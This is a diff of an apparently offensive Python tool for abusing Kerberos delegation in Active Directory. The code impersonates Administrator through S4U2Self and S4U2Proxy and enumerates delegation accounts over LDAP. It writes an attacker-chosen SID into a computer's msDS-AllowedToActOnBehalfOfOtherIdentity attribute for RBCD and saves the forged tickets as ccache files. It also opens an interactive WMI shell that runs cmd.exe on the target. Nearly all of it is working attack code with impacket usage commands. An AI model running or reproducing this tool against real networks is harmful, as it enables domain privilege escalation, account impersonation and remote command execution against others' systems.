-      TO ITSELF. This simulates a user who authenticated via a non-Kerberos
-      protocol (NTLM, forms, certificates) but the backend needs a Kerberos
-      ticket for that user.
-
-    WHAT HAPPENS INSIDE THE TGS-REQ:
-      1. We include our TGT in the request (proves who WE are)
-      2. We include a PA-FOR-USER structure containing:
-           - Username we want to impersonate
-           - Our realm
-           - A checksum signed with our session key
-      3. KDC verifies our TGT, then generates a service ticket:
-           Client = impersonate_user  (the victim)
-           Server = username          (us, the service)
-      4. This ticket says "impersonate_user authenticated to username's service"
-
-    KEY FLAG — forwardable:
-      If our account has "TrustedToAuthForDelegation" (T2A4D) set,
-      the returned ticket will be FORWARDABLE — required for S4U2Proxy.
-      Without T2A4D, the ticket is non-forwardable and S4U2Proxy will fail
-      UNLESS we're doing RBCD (which doesn't require it).
-
-    RESULT:
-      We get a service ticket that says Administrator logged into our service.
-      We haven't touched Administrator's password at all.
-    """
-    print(f"\n{B}{'─'*55}")
-    print(f"  STEP 2 — S4U2Self")
-    print(f"{'─'*55}{RS}")
-    print(f"  {C}Impersonating:  {impersonate_user}{RS}")
-    print(f"  {C}Service (us):   {username}@{domain.upper()}{RS}")
-    print(f"  {C}Sending TGS-REQ with PA-FOR-USER extension...{RS}")
-    print(f"  {Y}")
-    print(f"    What we're asking the KDC:")
-    print(f"    'I am {username}. Give me a service ticket")
-    print(f"     where the CLIENT is {impersonate_user}.'")
-    print(f"  {RS}")
-
-    # The user we want to impersonate
-    impersonate_principal = Principal(
-        impersonate_user,
-        type=constants.PrincipalNameType.NT_PRINCIPAL.value
-    )
-
-    # Our own service principal
-    server_principal = Principal(
-        username,
-        type=constants.PrincipalNameType.NT_PRINCIPAL.value
-    )
-
-    try:
-        # impacket's getKerberosTGS handles S4U2Self when we pass
-        # serverName = our own account and pass impersonateUser
-        tgs, cipher2, old_sk2, sk2 = getKerberosTGS(
-            serverName=server_principal,
-            domain=domain,
-            kdcHost=dc_ip,
-            tgt=tgt,
-            cipher=cipher,
-            sessionKey=sk,
-            impersonateUser=impersonate_principal   # ← THIS triggers S4U2Self
-        )
-
-        print(f"  {G}[+] S4U2Self SUCCESS!{RS}")
-        print(f"  {G}    Got ticket: {impersonate_user} → {username}{RS}")
-        print(f"  {Y}    This ticket proves '{impersonate_user} authenticated to us'")
-        print(f"    Next we use it to pivot to the actual target service.{RS}")
-        return tgs, cipher2, old_sk2, sk2
-
-    except Exception as e:
-        print(f"  {R}[!] S4U2Self failed: {e}{RS}")
-        print(f"  {Y}  Hint: Account may not have TrustedToAuthForDelegation set.{RS}")
-        print(f"  {Y}  For RBCD mode this is OK — forwardable not required.{RS}")
-        return None, None, None, None
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-# STEP 3 — S4U2Proxy: proxy the ticket to the actual target service
-# ─────────────────────────────────────────────────────────────────────────────
-def s4u2proxy(username, domain, dc_ip, target_spn, impersonate_user,
-              s4u2self_tgs, tgt, cipher, old_sk, sk):
-    """
-    S4U2Proxy: take our S4U2Self ticket and ask the KDC to issue a NEW
-    service ticket for impersonate_user → TARGET SERVICE.
-
-    WHY THIS WORKS:
-      Now that we have a ticket saying "{impersonate_user} → us",
-      we present it to the KDC along with our TGT and say:
-        "Use this ticket as evidence that impersonate_user delegated to us.
-         Issue a ticket for impersonate_user → target_spn"
-
-    WHAT HAPPENS INSIDE THE TGS-REQ:
-      1. We send our own TGT (authenticates us as the service)
-      2. We include the S4U2Self ticket in the 'additional-tickets' field
-      3. We set cname-in-addl-tkt flag — tells KDC to use the client name
-         from the additional ticket (= impersonate_user)
-      4. KDC checks:
-           - Is our account allowed to delegate to target_spn?
-             (msDS-AllowedToDelegateTo  OR  msDS-AllowedToActOnBehalfOf)
-           - Is the additional ticket forwardable? (required for classic CD,
-             not for RBCD)
-      5. If checks pass, KDC issues:
-           Client = impersonate_user
-           Server = target_spn
-           → This is a fully valid service ticket!
-
-    DIFFERENCE: Constrained Delegation vs RBCD
-      Classic CD:  delegation allowed is set on OUR account
-                   (msDS-AllowedToDelegateTo on svc_account)
-      RBCD:        delegation allowed is set on the TARGET machine
-                   (msDS-AllowedToActOnBehalfOfOtherIdentity on the DC/server)
-                   KDC checks the target's attribute, not ours.
-
-    RESULT:
-      We hold a Kerberos service ticket for:
-        impersonate_user@domain.com → cifs/WIN-RM9TRCNVS9P.domain.com
-      We can present this ticket directly to the target machine for SMB/WMI.
-    """
-    print(f"\n{B}{'─'*55}")
-    print(f"  STEP 3 — S4U2Proxy")
-    print(f"{'─'*55}{RS}")
-    print(f"  {C}Target SPN:     {target_spn}{RS}")
-    print(f"  {C}Impersonating:  {impersonate_user}{RS}")
-    print(f"  {Y}")
-    print(f"    What we're asking the KDC:")
-    print(f"    'I have proof that {impersonate_user} delegated to me.")
-    print(f"     Now give me a ticket for {impersonate_user} → {target_spn}'")
-    print(f"  {RS}")
-
-    target_principal = Principal(
-        target_spn,
-        type=constants.PrincipalNameType.NT_SRV_INST.value
-    )
-
-    try:
-        # S4U2Proxy: pass the S4U2Self TGS as the 'additional-tickets'
-        tgs, cipher2, old_sk2, sk2 = getKerberosTGS(
-            serverName=target_principal,
-            domain=domain,
-            kdcHost=dc_ip,
-            tgt=tgt,
-            cipher=cipher,
-            sessionKey=sk,
-            additionalTicket=s4u2self_tgs   # ← THIS triggers S4U2Proxy
-        )
-
-        print(f"  {G}[+] S4U2Proxy SUCCESS!{RS}")
-        print(f"  {G}    Got ticket: {impersonate_user} → {target_spn}{RS}")
-        print(f"  {G}    We now hold a valid Kerberos ticket as Administrator!{RS}")
-        return tgs, cipher2, old_sk2, sk2
-
-    except Exception as e:
-        print(f"  {R}[!] S4U2Proxy failed: {e}{RS}")
-        print(f"  {Y}  Common reasons:{RS}")
-        print(f"  {Y}    - Account not trusted for delegation to this SPN{RS}")
-        print(f"  {Y}    - S4U2Self ticket was not forwardable (classic CD){RS}")
-        print(f"  {Y}    - RBCD attribute not set on target computer{RS}")
-        return None, None, None, None
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-# STEP 4 — Save ticket as .ccache and use with SMB
-# ─────────────────────────────────────────────────────────────────────────────
-def save_ticket(tgs, username, domain, target_spn, impersonate_user):
-    """
-    Save the forged S4U ticket to a .ccache file.
-
-    WHY: impacket tools (smbclient.py, wmiexec.py, psexec.py) and
-         native Linux Kerberos tools (klist, kinit) read tickets from
-         .ccache files. We export KRB5CCNAME to point to our file.
-
-    FORMAT: MIT Kerberos credential cache — standard cross-platform format.
-    """
-    print(f"\n{B}{'─'*55}")
-    print(f"  STEP 4 — Save ticket to .ccache")
-    print(f"{'─'*55}{RS}")
-
-    ccache     = CCache()
+    ccache = CCache()
     ccache.fromTGS(tgs, f"{impersonate_user}@{domain.upper()}", target_spn)
 
-    filename   = f"s4u_{impersonate_user}_{target_spn.replace('/', '_')}.ccache"
+    filename = f"s4u_{impersonate_user}_{target_spn.replace('/', '_')}.ccache"
     ccache.saveFile(filename)
 
-    # Guard: SPN must contain '/' (e.g. cifs/host.domain)
     spn_parts = target_spn.split('/')
     target_host = spn_parts[1] if len(spn_parts) >= 2 else target_spn
 
-    print(f"  {G}[+] Ticket saved → {filename}{RS}")
-    print(f"\n  {C}Use the ticket:{RS}")
-    print(f"  {W}export KRB5CCNAME={filename}{RS}")
-    print(f"  {W}python3 smbclient.py -k -no-pass {domain}/{impersonate_user}@{target_host}{RS}")
-    print(f"  {W}python3 wmiexec.py -k -no-pass {domain}/{impersonate_user}@{target_host}{RS}")
-    print(f"  {W}python3 psexec.py -k -no-pass {domain}/{impersonate_user}@{target_host}{RS}")
+    print(Fore.GREEN + f"[+] Ticket saved -> {filename}" + Style.RESET_ALL)
+    print(Fore.CYAN + "\n  Use the ticket:" + Style.RESET_ALL)
+    print(Fore.WHITE + f"  export KRB5CCNAME={filename}" + Style.RESET_ALL)
     return filename
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-# LDAP — enumerate delegation accounts (useful for recon)
-# ─────────────────────────────────────────────────────────────────────────────
-def ldap_enum_delegation(dc_ip, domain, username, password, nt_hash=""):
-    """
-    Find accounts/computers with delegation configured:
-
-    1. Unconstrained Delegation
-       userAccountControl & TRUSTED_FOR_DELEGATION (0x80000)
-       → Service gets users' full TGT when they connect. Most dangerous.
-
-    2. Constrained Delegation (classic)
-       msDS-AllowedToDelegateTo is set
-       → Service can only delegate to specific SPNs listed here.
-
-    3. Resource-Based Constrained Delegation
-       msDS-AllowedToActOnBehalfOfOtherIdentity is set on COMPUTER objects
-       → The TARGET machine decides who can delegate to it.
-
-    4. TrustedToAuthForDelegation (T2A4D)
-       userAccountControl & TRUSTED_TO_AUTH_FOR_DELEGATION (0x1000000)
-       → Required for S4U2Self to produce a forwardable ticket (classic CD).
-    """
-    base_dn = "DC=" + domain.replace(".", ",DC=")
-    print(f"\n{B}[*] Connecting to LDAP {dc_ip} for delegation recon...{RS}")
-
-    try:
-        conn = ldap.LDAPConnection(f"ldap://{dc_ip}", base_dn)
-        if nt_hash:
-            conn.login(username, "", domain, "aad3b435b51404eeaad3b435b51404ee", nt_hash)
-        else:
-            conn.login(username, password, domain)
-        print(f"  {G}[+] Authenticated as {username}@{domain}{RS}")
-    except Exception as e:
-        print(f"  {R}[!] LDAP failed: {e}{RS}")
-        sys.exit(1)
-
-    results = {
-        "unconstrained": [],
-        "constrained":   [],
-        "rbcd":          [],
-    }
-
-    # ── 1. Unconstrained Delegation ──
-    print(f"\n  {C}[1] Searching unconstrained delegation (flag 0x80000)...{RS}")
-    try:
-        resp = conn.search(
-            searchFilter=(
-                "(&"
-                "(|(objectClass=user)(objectClass=computer))"
-                "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
-                "(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
-                ")"
-            ),
-            attributes=["sAMAccountName", "objectClass", "userAccountControl"]
-        )
-        for item in resp:
-            if not isinstance(item, ldapasn1.SearchResultEntry):
-                continue
-            sam = ""
-            for attr in item['attributes']:
-                if str(attr['type']) == "sAMAccountName":
-                    sam = str(attr['vals'][0])
-            if sam:
-                results["unconstrained"].append(sam)
-    except Exception as e:
-        print(f"  {R}  Error: {e}{RS}")
-
-    # ── 2. Constrained Delegation ──
-    print(f"  {C}[2] Searching constrained delegation (msDS-AllowedToDelegateTo)...{RS}")
-    try:
-        resp = conn.search(
-            searchFilter=(
-                "(&"
-                "(|(objectClass=user)(objectClass=computer))"
-                "(msDS-AllowedToDelegateTo=*)"
-                "(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
-                ")"
-            ),
-            attributes=["sAMAccountName", "msDS-AllowedToDelegateTo",
-                        "userAccountControl"]
-        )
-        for item in resp:
-            if not isinstance(item, ldapasn1.SearchResultEntry):
-                continue
-            sam, spns, uac = "", [], 0
-            for attr in item['attributes']:
-                name = str(attr['type'])
-                vals = [str(v) for v in attr['vals']]
-                if name == "sAMAccountName":
-                    sam = vals[0]
-                elif name == "msDS-AllowedToDelegateTo":
-                    spns = vals
-                elif name == "userAccountControl":
-                    uac = int(vals[0])
-            if sam and spns:
-                # T2A4D flag = 0x1000000 = 16777216
-                t2a4d = bool(uac & 16777216)
-                results["constrained"].append({
-                    "account": sam,
-                    "spns":    spns,
-                    "t2a4d":   t2a4d
-                })
-    except Exception as e:
-        print(f"  {R}  Error: {e}{RS}")
-
-    # ── 3. RBCD ──
-    print(f"  {C}[3] Searching RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity)...{RS}")
-    try:
-        resp = conn.search(
-            searchFilter=(
-                "(&"
-                "(objectClass=computer)"
-                "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
-                ")"
-            ),
-            attributes=["sAMAccountName", "msDS-AllowedToActOnBehalfOfOtherIdentity"]
-        )
-        for item in resp:
-            if not isinstance(item, ldapasn1.SearchResultEntry):
-                continue
-            sam = ""
-            for attr in item['attributes']:
-                if str(attr['type']) == "sAMAccountName":
-                    sam = str(attr['vals'][0])
-            if sam:
-                results["rbcd"].append(sam)
-    except Exception as e:
-        print(f"  {R}  Error: {e}{RS}")
-
-    conn.close()
-
-    # ── Print results ──
-    print(f"\n{G}{BO}════ DELEGATION ENUMERATION RESULTS ════{RS}\n")
-
-    print(f"{Y}{BO}[1] UNCONSTRAINED DELEGATION{RS} "
-          f"(most dangerous — gets full TGT of any connecting user)")
-    if results["unconstrained"]:
-        for acc in results["unconstrained"]:
-            print(f"  {R}  ⚠  {acc}{RS}")
-    else:
-        print(f"  {G}  None found{RS}")
-
-    print(f"\n{Y}{BO}[2] CONSTRAINED DELEGATION{RS} "
-          f"(can delegate to specific SPNs only)")
-    if results["constrained"]:
-        for entry in results["constrained"]:
-            t2a4d_flag = f"{G}T2A4D=YES{RS}" if entry['t2a4d'] else f"{R}T2A4D=NO{RS}"
-            print(f"  {C}  {entry['account']:<30}{RS} [{t2a4d_flag}]")
-            for spn in entry['spns']:
-                print(f"      {B}↳ {spn}{RS}")
-    else:
-        print(f"  {G}  None found{RS}")
-
-    print(f"\n{Y}{BO}[3] RESOURCE-BASED CONSTRAINED DELEGATION{RS} "
-          f"(RBCD — set on target machine)")
-    if results["rbcd"]:
-        for acc in results["rbcd"]:
-            print(f"  {C}  {acc}{RS}")
-    else:
-        print(f"  {G}  None found{RS}")
-
-    return results
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-# RBCD SETUP — write msDS-AllowedToActOnBehalfOfOtherIdentity
-# ─────────────────────────────────────────────────────────────────────────────
-def rbcd_setup(dc_ip, domain, username, password, target_computer,
-               attacker_account_sid, nt_hash=""):
-    """
-    Write our attacker-controlled account's SID into the target computer's
-    msDS-AllowedToActOnBehalfOfOtherIdentity attribute.
-
-    WHY: This tells the KDC:
-      "Computer TARGET trusts ATTACKER_ACCOUNT to delegate to it."
-      Once set, we can S4U2Self + S4U2Proxy as any user to TARGET.
-
-    WHAT WE'RE WRITING:
-      A Security Descriptor (SECURITY_DESCRIPTOR) in binary format
-      containing a DACL with an ACE that allows our SID to delegate.
-
-      Structure:
-        SECURITY_DESCRIPTOR
-          └── DACL
-                └── ACE (ACCESS_ALLOWED, SID=attacker_account_sid)
-
-    PREREQUISITE:
-      You must have WRITE access to the target computer object.
-      This comes from:
-        - GenericWrite / GenericAll on the computer
-        - WriteDacl
-        - Owning the object
-      Often found via BloodHound → bad ACL paths.
-
-    ATTACKER_ACCOUNT_SID:
-      The SID of the machine/user account you control.
-      Get it from: python3 s4u.py --get-sid -u <account> ...
-    """
-    print(f"\n{B}{'─'*55}")
-    print(f"  RBCD SETUP — Writing delegation attribute")
-    print(f"{'─'*55}{RS}")
-    print(f"  {C}Target computer:      {target_computer}{RS}")
-    print(f"  {C}Attacker account SID: {attacker_account_sid}{RS}")
-    print(f"  {Y}")
-    print(f"    We're writing a Security Descriptor to:")
-    print(f"    {target_computer}$  →  msDS-AllowedToActOnBehalfOfOtherIdentity")
-    print(f"    This grants our account the right to use S4U2Proxy")
-    print(f"    against {target_computer} as ANY user.")
-    print(f"  {RS}")
-
-    base_dn = "DC=" + domain.replace(".", ",DC=")
-    try:
-        conn = ldap.LDAPConnection(f"ldap://{dc_ip}", base_dn)
-        if nt_hash:
-            conn.login(username, "", domain, "aad3b435b51404eeaad3b435b51404ee", nt_hash)
-        else:
-            conn.login(username, password, domain)
-        print(f"  {G}[+] LDAP authenticated{RS}")
-    except Exception as e:
-        print(f"  {R}[!] LDAP failed: {e}{RS}")
-        return False
-
-    # Build the Security Descriptor binary blob
-    # Format: SECURITY_DESCRIPTOR with one DACL ACE allowing our SID
-    try:
-        sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
-        sd['Revision'] = b'\x01'
-        sd['Sbz1']     = b'\x00'
-        # SE_DACL_PRESENT=0x0004 | SE_SELF_RELATIVE=0x8000 → little-endian bytes
-        sd['Control']  = b'\x04\x80'
-        sd['OwnerSid'] = ldaptypes.LDAP_SID()
-        sd['GroupSid'] = ldaptypes.LDAP_SID()
-
-        # Build DACL with one plain ACCESS_ALLOWED_ACE (not object ACE)
-        acl = ldaptypes.ACL()
-        acl['AclRevision'] = 2   # ACL_REVISION for non-object ACEs
-        acl['Sbz1']        = 0
-        acl['Sbz2']        = 0
-
-        ace = ldaptypes.ACCESS_ALLOWED_ACE()
-        ace['Mask'] = ldaptypes.ACCESS_MASK()
-        ace['Mask']['Mask'] = 0xf01ff    # GENERIC_ALL
-        ace['Flags'] = 0
-
-        # Parse the SID string
-        ace_sid = ldaptypes.LDAP_SID()
-        ace_sid.fromCanonical(attacker_account_sid)
-        ace['Sid'] = ace_sid
-
-        acl['Data'] = ace.getData()
-        sd['Dacl']  = acl
-
-        # Find the target computer's DN
-        resp = conn.search(
-            searchFilter=f"(sAMAccountName={target_computer}$)",
-            attributes=["distinguishedName"]
-        )
-        target_dn = None
-        for item in resp:
-            if not isinstance(item, ldapasn1.SearchResultEntry):
-                continue
-            for attr in item['attributes']:
-                if str(attr['type']) == "distinguishedName":
-                    target_dn = str(attr['vals'][0])
-
-        if not target_dn:
-            print(f"  {R}[!] Computer {target_computer} not found in LDAP{RS}")
-            return False
-
-        print(f"  {B}  Target DN: {target_dn}{RS}")
-
-        # Write the attribute using impacket's modifyObject
-        conn.modifyObject(
-            target_dn,
-            {
-                'msDS-AllowedToActOnBehalfOfOtherIdentity': (
-                    ldap.MODIFY_REPLACE, [sd.getData()]
-                )
-            }
-        )
-        print(f"  {G}[+] RBCD attribute written successfully!{RS}")
-        print(f"  {G}    {target_computer} now trusts our account for delegation.{RS}")
-        conn.close()
-        return True
-
-    except Exception as e:
-        print(f"  {R}[!] Failed to write attribute: {e}{RS}")
-        print(f"  {Y}  Check that you have GenericWrite/WriteDacl on {target_computer}${RS}")
-        conn.close()
-        return False
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-# WMI SHELL — uses opth_final.py loaded dynamically via importlib
+# WMI SHELL
 # ─────────────────────────────────────────────────────────────────────────────
 def _launch_wmi_shell_with_ccache(args, ccache_path):
-    """
-    Interactive WMI shell using the S4U ccache ticket.
-    Fully self-contained — no dependency on any external script.
-
-    HOW:
-      1. Set KRB5CCNAME so impacket uses our ticket automatically
-      2. Create SMBConnection with useCache=True (reads KRB5CCNAME)
-      3. Connect via DCOM/WMI with doKerberos=True + empty hash
-      4. Run commands via Win32_Process, read output back over SMB C$
-    """
-    try:
-        from impacket.dcerpc.v5.dcom import wmi as wmi_mod
-        from impacket.dcerpc.v5.dcomrt import DCOMConnection
-        from impacket.dcerpc.v5.dtypes import NULL
-    except ImportError:
-        print(f"  {R}[!] impacket DCOM modules not found.{RS}")
-        print(f"  {Y}  Run: pip install impacket{RS}")
-        return
-
-    import time
-
-    # ─ Set KRB5CCNAME ────────────────────────────────────────────────
     abs_ccache = os.path.abspath(ccache_path)
     os.environ["KRB5CCNAME"] = abs_ccache
-    print(f"\n  {G}[+] KRB5CCNAME → {abs_ccache}{RS}")
+    print(Fore.GREEN + f"\n[+] KRB5CCNAME -> {abs_ccache}" + Style.RESET_ALL)
 
-    spn_parts   = args.target_spn.split('/')
+    spn_parts = args.target_spn.split('/')
     target_host = spn_parts[1] if len(spn_parts) >= 2 else args.dc
-    out_file    = f"__s4u_{os.getpid()}"
-    out_unc     = f"\\\\127.0.0.1\\C$\\{out_file}"
+    out_file = f"__s4u_{os.getpid()}"
+    out_unc = "\\\\127.0.0.1\\C$\\{}".format(out_file)
 
-    # ─ SMB connection (reads ccache via KRB5CCNAME) ──────────────────
     try:
-        print(f"  {C}Connecting SMB → {target_host}...{RS}")
+        print(Fore.BLUE + f"[*] Connecting SMB -> {target_host}..." + Style.RESET_ALL)
         smb = SMBConnection(target_host, args.dc, sess_port=445, timeout=30)
         smb.kerberosLogin(
             user=args.impersonate, password="", domain=args.domain,
             lmhash="", nthash="", aesKey="",
             kdcHost=args.dc, useCache=True
         )
-        print(f"  {G}[+] SMB OK — authenticated as {args.impersonate}@{args.domain}{RS}")
+        print(Fore.GREEN + f"[+] SMB OK — authenticated as {args.impersonate}@{args.domain}" + Style.RESET_ALL)
     except Exception as e:
-        print(f"  {R}[!] SMB failed: {e}{RS}")
+        print(Fore.RED + f"[-] SMB failed: {e}" + Style.RESET_ALL)
         return
 
-    # ─ DCOM / WMI connection ─────────────────────────────────────────
     try:
-        print(f"  {C}Connecting WMI → {target_host}...{RS}")
+        print(Fore.BLUE + f"[*] Connecting WMI -> {target_host}..." + Style.RESET_ALL)
         dcom = DCOMConnection(
             target_host,
             username=args.impersonate, password="",
@@ -667,94 +779,82 @@ def _launch_wmi_shell_with_ccache(args, ccache_path):
             doKerberos=True,
             kdcHost=args.dc
         )
-        iface         = dcom.CoCreateInstanceEx(wmi_mod.CLSID_WbemLevel1Login,
-                                                wmi_mod.IID_IWbemLevel1Login)
-        iWbemLogin    = wmi_mod.IWbemLevel1Login(iface)
+        iface = dcom.CoCreateInstanceEx(wmi_mod.CLSID_WbemLevel1Login, wmi_mod.IID_IWbemLevel1Login)
+        iWbemLogin = wmi_mod.IWbemLevel1Login(iface)
         iWbemServices = iWbemLogin.NTLMLogin("//./root/cimv2", NULL, NULL)
         iWbemLogin.RemRelease()
         win32Process, _ = iWbemServices.GetObject("Win32_Process")
     except Exception as e:
-        print(f"  {R}[!] WMI connection failed: {e}{RS}")
+        print(Fore.RED + f"[-] WMI connection failed: {e}" + Style.RESET_ALL)
         try: dcom.disconnect()
-        except Exception: pass
+        except: pass
         try: smb.logoff()
-        except Exception: pass
+        except: pass
         return
 
-    print(f"\n  {G}{BO}[+] WMI Shell ready!{RS}")
-    print(f"  {G}    Connected: {args.domain}\\{args.impersonate}@{target_host}{RS}")
-    print(f"  {Y}    Type 'exit' to quit. Ctrl+C cancels current command.{RS}\n")
+    print(Fore.GREEN + "\n[+] WMI Shell ready!" + Style.RESET_ALL)
+    print(Fore.GREEN + f"    Connected: {args.domain}\\{args.impersonate}@{target_host}" + Style.RESET_ALL)
+    print(Fore.YELLOW + "    Type 'exit' to quit. Ctrl+C cancels current command." + Style.RESET_ALL + "\n")
 
-    import signal
-    import io
+    cwd = "C:\\"
+    _running = [True]
 
-    cwd          = "C:\\"
-    _running     = [True]   # mutable so the signal handler can write it
-
-    # ── Install a clean Ctrl+C handler ───────────────────────────────
-    # Without this, KeyboardInterrupt propagates into impacket's C-extension
-    # threads and produces multi-line tracebacks.
     def _sigint(sig, frame):
         _running[0] = False
-        print(f"\n  {Y}[*] Ctrl+C — exiting shell...{RS}", flush=True)
+        print(Fore.YELLOW + "\n[*] Ctrl+C — exiting shell..." + Style.RESET_ALL, flush=True)
 
     old_handler = signal.signal(signal.SIGINT, _sigint)
 
     def _cleanup():
-        """Disconnect silently — suppress impacket's error messages."""
-        signal.signal(signal.SIGINT, old_handler)   # restore original handler
+        signal.signal(signal.SIGINT, old_handler)
         _devnull = open(os.devnull, "w")
         _old_err, sys.stderr = sys.stderr, _devnull
         try:
             dcom.disconnect()
-        except Exception:
+        except:
             pass
         try:
             smb.logoff()
-        except Exception:
+        except:
             pass
         sys.stderr = _old_err
         _devnull.close()
-        print(f"  {G}[+] WMI session closed.{RS}\n")
+        print(Fore.GREEN + "[+] WMI session closed." + Style.RESET_ALL + "\n")
 
-    # ── Shell loop ───────────────────────────────────────────────────
     while _running[0]:
         try:
             cmd_in = input(
-                f"  {Y}[WMI] {args.domain}\\{args.impersonate}:{cwd}> {RS}"
+                f"  {Fore.YELLOW}[WMI] {args.domain}\\{args.impersonate}:{cwd}> {Style.RESET_ALL}"
             ).strip()
         except EOFError:
             break
         except KeyboardInterrupt:
-            # Ctrl+C at the prompt — caught here before signal handler fires
             _running[0] = False
-            print(f"\n  {Y}[*] Ctrl+C — exiting shell...{RS}")
+            print(Fore.YELLOW + "\n[*] Ctrl+C — exiting shell..." + Style.RESET_ALL)
             break
 
         if not cmd_in:
             continue
         if cmd_in.lower() in ("exit", "quit", "q"):
-            print(f"  {Y}[*] Closing shell...{RS}")
+            print(Fore.YELLOW + "[*] Closing shell..." + Style.RESET_ALL)
             break
 
         full_cmd = (
-            f"cmd.exe /Q /v:on /c "
-            f"(cd /d \"{cwd}\" && {cmd_in} & echo __CWD_S__!CD!__CWD_E__) "
-            f"1> {out_unc} 2>&1"
+            "cmd.exe /Q /v:on /c "
+            '(cd /d "' + cwd + '" && ' + cmd_in + ' & echo __CWD_S__!CD!__CWD_E__) '
+            '1> ' + out_unc + ' 2>&1'
         )
 
         try:
             win32Process.Create(full_cmd, "C:\\", None)
         except Exception as e:
-            print(f"  {R}[!] Execution error: {e}{RS}")
+            print(Fore.RED + f"[-] Execution error: {e}" + Style.RESET_ALL)
             continue
 
-        # Wait for output — Ctrl+C here just skips the read, shell stays open
         try:
-            import time as _time
-            _time.sleep(1.5)
+            time.sleep(1.5)
         except KeyboardInterrupt:
-            print(f"  {Y}[*] Command interrupted (output may be incomplete){RS}")
+            print(Fore.YELLOW + "[*] Command interrupted (output may be incomplete)" + Style.RESET_ALL)
             continue
 
         try:
@@ -773,150 +873,59 @@ def _launch_wmi_shell_with_ccache(args, ccache_path):
 
             try:
                 smb.deleteFile("C$", out_file)
-            except Exception:
+            except:
                 pass
 
         except KeyboardInterrupt:
-            print(f"  {Y}[*] Read interrupted{RS}")
+            print(Fore.YELLOW + "[*] Read interrupted" + Style.RESET_ALL)
             continue
         except Exception as e:
-            print(f"  {R}[!] Output read error: {e}{RS}")
+            print(Fore.RED + f"[-] Output read error: {e}" + Style.RESET_ALL)
 
     _cleanup()
 
 
-
-
-def _find_getST():
-    """
-    Locate the impacket getST binary on the system.
-    Checks PATH first, then common install locations on Kali/Debian.
-    """
-    for candidate in ["impacket-getST", "getST.py"]:
-        found = shutil.which(candidate)
-        if found:
-            return found
-    for path in [
-        "/usr/bin/impacket-getST",
-        "/usr/local/bin/impacket-getST",
-        "/usr/share/doc/python3-impacket/examples/getST.py",
-        "/usr/share/impacket/getST.py",
-    ]:
-        if os.path.exists(path):
-            return path
-    return None
-
-
-def s4u_via_getST(args, password, nt_hash):
-    """
-    Perform S4U2Self + S4U2Proxy using impacket-getST.
-
-    WHY: Older impacket versions don't expose impersonateUser / additionalTicket
-         as kwargs in getKerberosTGS(). impacket-getST is the reference tool
-         that handles S4U correctly in every impacket release.
-
-    WHAT IT DOES:
-      1. Calls impacket-getST with -spn and -impersonate flags
-      2. getST internally does TGT → S4U2Self → S4U2Proxy
-      3. It saves the ticket as <user>.ccache in the current directory
-      4. We rename it to our standard filename and print usage commands
-    """
-    getST = _find_getST()
-    if getST is None:
-        print(f"\n  {R}[!] impacket-getST not found on this system.{RS}")
-        print(f"  {Y}  Fix: pip install git+https://github.com/fortra/impacket.git --break-system-packages{RS}")
-        sys.exit(1)
-
-    print(f"\n{B}{'─'*55}")
-    print(f"  S4U ATTACK — via impacket-getST")
-    print(f"{'─'*55}{RS}")
-    print(f"  {C}Service account: {args.username}{RS}")
-    print(f"  {C}Impersonating:   {args.impersonate}{RS}")
-    print(f"  {C}Target SPN:      {args.target_spn}{RS}")
-    print(f"  {C}Using tool:      {getST}{RS}")
-
-    # Build command
-    cmd = [getST, "-spn", args.target_spn,
-           "-impersonate", args.impersonate,
-           "-dc-ip", args.dc]
-
-    if nt_hash:
-        cmd += ["-hashes", f":{nt_hash}", f"{args.domain}/{args.username}"]
-    else:
-        cmd += [f"{args.domain}/{args.username}:{password}"]
-
-    print(f"\n  {Y}Running getST... {RS}")
-
-    result = subprocess.run(cmd, capture_output=True, text=True)
-    output  = result.stdout + result.stderr
-
-    # getST ccache naming changed across versions:
-    #   impacket ≤0.10 : Administrator.ccache
-    #   impacket ≥0.11 : Administrator@cifs_host@REALM.ccache
-    # Use glob to find whichever format was written.
-    ccache_dst = f"s4u_{args.impersonate}_{args.target_spn.replace('/', '_')}.ccache"
-
-    candidates = (
-        glob.glob(f"{args.impersonate}.ccache") +
-        glob.glob(f"{args.impersonate}@*.ccache")
-    )
-    ccache_src = max(candidates, key=os.path.getmtime) if candidates else None
-
-    if ccache_src:
-        os.rename(ccache_src, ccache_dst)
-
-        spn_parts   = args.target_spn.split('/')
-        target_host = spn_parts[1] if len(spn_parts) >= 2 else args.target_spn
-
-        print(f"  {G}[+] S4U2Self + S4U2Proxy SUCCESS!{RS}")
-        print(f"  {G}    Ticket: {args.impersonate} → {args.target_spn}{RS}")
-        print(f"  {G}    Saved → {ccache_dst}{RS}")
-        print(f"\n  {C}Use the ticket:{RS}")
-        print(f"  {W}export KRB5CCNAME={ccache_dst}{RS}")
-        print(f"  {W}impacket-wmiexec   -k -no-pass {args.domain}/{args.impersonate}@{target_host}{RS}")
-        print(f"  {W}impacket-smbclient -k -no-pass {args.domain}/{args.impersonate}@{target_host}{RS}")
-        print(f"  {W}impacket-psexec    -k -no-pass {args.domain}/{args.impersonate}@{target_host}{RS}")
-
-        # Offer to open WMI shell immediately using opth_final.py
-        try:
-            shell_ans = input(
-                f"\n  {C}Open interactive WMI shell as {args.impersonate} now? (y/n) [n]: {RS}"
-            ).strip().lower()
-        except EOFError:
-            shell_ans = "n"
-
-        if shell_ans in ("y", "yes"):
-            _launch_wmi_shell_with_ccache(args, ccache_dst)
-    else:
-        print(f"  {R}[!] S4U failed — no ccache file found. getST output:{RS}")
-        print(output)
-        sys.exit(1)
-
-
+# ─────────────────────────────────────────────────────────────────────────────
+# FLOW FUNCTIONS
+# ─────────────────────────────────────────────────────────────────────────────
 def flow_constrained(args, password, nt_hash):
-    """
-    CONSTRAINED DELEGATION ATTACK FLOW
-    ════════════════════════════════════
-    Prerequisite:
-      You have credentials for a service account that has
-      msDS-AllowedToDelegateTo set pointing to the target SPN.
-    """
-    print(f"\n{M}{BO}[ CONSTRAINED DELEGATION FLOW ]{RS}")
